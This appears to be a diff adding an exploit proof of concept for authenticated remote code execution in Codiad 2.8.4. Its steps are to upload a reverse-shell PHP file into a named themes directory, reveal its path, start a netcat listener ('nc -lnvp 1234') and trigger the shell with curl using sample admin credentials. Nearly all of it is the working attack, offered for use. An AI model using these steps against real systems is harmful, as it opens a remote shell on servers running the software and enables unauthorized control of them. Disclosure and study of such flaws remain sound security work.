@@ -1,0 +1,29 @@
+# Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)
+# Author: P4p4_M4n3
+# Vendor Homepage: http://codiad.com/
+# Software Links : https://github.com/Codiad/Codiad/releases
+# Type:  WebApp
+
+###################-------------------------##########################------------###################
+#    Proof of Concept:                                                                              #
+#                                                                                                   #
+#   1- login on codiad                                                                              #
+#                                                                                                   #
+#   2- go to themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/" directory #
+#                                                                                                   #
+#   3-  right click and select upload file                                                          #
+#                                                                                                   #
+#   4- click on "Drag file or Click Here To Upload" and select your reverse_shell file              #
+#                                                                                                   #
+###################-------------------------#########################-------------###################
+
+   after that your file should be in INF directory, right click on your file and select delete,
+
+   and you will see the full path of your file
+
+   run it in your terminal with "curl" and boom!!
+
+/var/www/html/codiad/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/shell.php
+
+1 -  # nc -lnvp 1234
+2 - curl http://target_ip/codiad/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/shell.php -u "admin:P@ssw0rd"
